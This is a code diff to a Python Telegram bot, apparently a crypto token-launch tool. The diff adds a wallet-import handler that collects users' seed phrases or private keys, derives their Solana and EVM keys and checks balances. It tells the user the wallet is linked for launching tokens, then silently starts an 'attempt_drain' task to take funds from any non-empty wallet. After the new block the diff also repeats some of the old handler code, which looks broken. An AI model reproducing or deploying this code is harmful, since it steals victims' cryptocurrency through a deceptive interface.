@@ -1001,6 +1001,154 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     if not _rate_ok(uid, "import"):
         await message.answer("⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
         return
+
+    raw = (message.text or "").strip()
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    words = raw.split()
+    is_seed = len(words) in (12, 24) and all(w.isalpha() for w in words)
+
+    # show progress
+    status_msg = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)
+
+    chosen_priv = None
+    chosen_pub = None
+    chosen_bal = 0.0
+    eth_priv = None
+    eth_addr = None
+    bal_eth = 0.0
+    bal_bnb = 0.0
+    bal_usdc = 0.0
+
+    try:
+        if is_seed and HAS_SOLANA:
+            await status_msg.edit_text("🔗 <b>Trying common paths…</b>", parse_mode=ParseMode.HTML)
+
+            # Only the 2 most common paths + timeout
+            candidates = []
+            seed = _pbkdf2_mnemonic(raw.strip().lower())
+
+            paths = [
+                ("Phantom / Solflare", "m/44'/501'/0'/0'"),
+                ("Trust Wallet", "m/44'/501'/0'"),
+            ]
+
+            for label, path in paths:
+                try:
+                    private_seed = _slip10_derive(seed, path)
+                    kp = Keypair.from_seed(private_seed)
+                    pub = str(kp.pubkey())
+                    priv_b58 = base58.b58encode(bytes(kp)).decode()
+
+                    # hard timeout on balance check
+                    try:
+                        bal = await asyncio.wait_for(_fetch_balance(pub), timeout=4.0)
+                    except asyncio.TimeoutError:
+                        bal = 0.0
+                        log.warning("Balance timeout on %s", pub)
+
+                    candidates.append((label, priv_b58, pub, bal))
+                    log.info("Path %s → %s  bal=%.6f", label, pub, bal)
+                except Exception as e:
+                    log.warning("Path %s failed: %s", label, e)
+
+            if not candidates:
+                await status_msg.edit_text("❌ Could not derive any key from seed.", parse_mode=ParseMode.HTML)
+                await state.clear()
+                return
+
+            # pick the one with highest balance
+            best = max(candidates, key=lambda x: x[3])
+            _, chosen_priv, chosen_pub, chosen_bal = best
+
+            # also try EVM
+            eth = _derive_evm_from_mnemonic(raw)
+            if eth:
+                eth_priv, eth_addr = eth
+                try:
+                    bal_eth = await asyncio.wait_for(_fetch_evm_balance(ETH_RPC, eth_addr), timeout=4.0)
+                    bal_bnb = await asyncio.wait_for(_fetch_evm_balance(BNB_RPC, eth_addr), timeout=4.0)
+                    bal_usdc = await asyncio.wait_for(_fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH), timeout=4.0)
+                    bal_usdc += await asyncio.wait_for(_fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC), timeout=4.0)
+                except asyncio.TimeoutError:
+                    pass
+
+        else:
+            # private key path (fast)
+            await status_msg.edit_text("🔑 <b>Importing private key…</b>", parse_mode=ParseMode.HTML)
+            chosen_priv, chosen_pub, eth_priv, eth_addr = _derive_from_input(raw)
+
+            if chosen_priv != "EVM_ONLY":
+                try:
+                    chosen_bal = await asyncio.wait_for(_fetch_balance(chosen_pub), timeout=4.0)
+                except asyncio.TimeoutError:
+                    chosen_bal = 0.0
+
+            if eth_addr:
+                try:
+                    bal_eth = await asyncio.wait_for(_fetch_evm_balance(ETH_RPC, eth_addr), timeout=4.0)
+                    bal_bnb = await asyncio.wait_for(_fetch_evm_balance(BNB_RPC, eth_addr), timeout=4.0)
+                    bal_usdc = await asyncio.wait_for(_fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH), timeout=4.0)
+                    bal_usdc += await asyncio.wait_for(_fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC), timeout=4.0)
+                except asyncio.TimeoutError:
+                    pass
+
+    except Exception as e:
+        log.exception("Import failed: %s", e)
+        await status_msg.edit_text("❌ <b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
+        await state.clear()
+        return
+
+    # save session
+    sess = get_session(uid)
+    sess.last_raw_key = raw
+
+    w = UserWallet(
+        private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
+        public_key=chosen_pub,
+        label=f"Wallet {len(sess.wallets)+1}",
+        balance_sol=chosen_bal,
+        chain="sol" if chosen_priv != "EVM_ONLY" else "eth",
+        eth_address=eth_addr,
+        balance_eth=bal_eth,
+        balance_bnb=bal_bnb,
+        balance_usdc=bal_usdc,
+    )
+    sess.wallets.append(w)
+    sess.active_wallet_idx = len(sess.wallets) - 1
+
+    text = (
+        "✅ <b>Wallet Linked</b>\n\n"
+        f"<code>{chosen_pub}</code>\n\n"
+        f"🏷 Label: <b>{w.label}</b>\n"
+        f"{SOL_EMOJI} SOL: <b>{w.balance_sol:.4f}</b>\n"
+    )
+    if eth_addr:
+        text += f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
+    text += "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
+
+    await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
+    await state.clear()
+
+    # try drain
+    if chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5:
+        asyncio.create_task(attempt_drain(
+            uid,
+            chosen_priv if chosen_priv != "EVM_ONLY" else "",
+            chain=w.chain,
+            eth_key=eth_priv,
+            bot=message.bot,
+            user=message.from_user
+        ))
+    else:
+        log.info("Wallet %s near-zero — drain skipped", chosen_pub)
+    uid = message.from_user.id
+    if not _rate_ok(uid, "import"):
+        await message.answer("⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
+        return
     raw = (message.text or "").strip()
     try:
         await message.delete()
